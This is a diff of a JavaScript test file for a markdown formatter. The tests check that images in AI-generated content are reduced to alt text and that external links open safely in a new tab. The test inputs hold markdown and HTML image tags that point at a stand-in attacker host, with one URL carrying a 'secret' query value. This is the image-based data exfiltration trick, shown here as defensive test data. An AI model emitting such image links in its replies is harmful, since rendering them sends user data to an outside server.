@@ -35,8 +35,8 @@ describe('formatMarkdown', () => {
     expect(html).toContain('Title')
   })
 
-  it('replaces images with their alt text when noImages is set', () => {
-    const html = formatMarkdown('Voir ![le graphe](https://evil.example/?d=secret) et <img src="https://evil.example/x" alt="brut">', { minDepth: 3, noHeadings: false, noImages: true })
+  it('replaces images with their alt text in generated content', () => {
+    const html = formatMarkdown('Voir ![le graphe](https://evil.example/?d=secret) et <img src="https://evil.example/x" alt="brut">', { minDepth: 3, noHeadings: false, generated: true })
     expect(html).not.toContain('<img')
     expect(html).not.toContain('evil.example')
     expect(html).toContain('le graphe')
@@ -45,7 +45,7 @@ describe('formatMarkdown', () => {
 
   // An assistant reply sits next to an unsaved chart: its links must not replace the page.
   it('opens the external links of untrusted generated content in a new tab, without referrer', () => {
-    const html = formatMarkdown('[source](https://example.com/data)', { minDepth: 3, noHeadings: false, noImages: true })
+    const html = formatMarkdown('[source](https://example.com/data)', { minDepth: 3, noHeadings: false, generated: true })
     expect(html).toContain('target="_blank"')
     expect(html).toContain('rel="ugc nofollow noopener noreferrer"')
     expect(formatMarkdown('[source](https://example.com/data)')).not.toContain('target=')
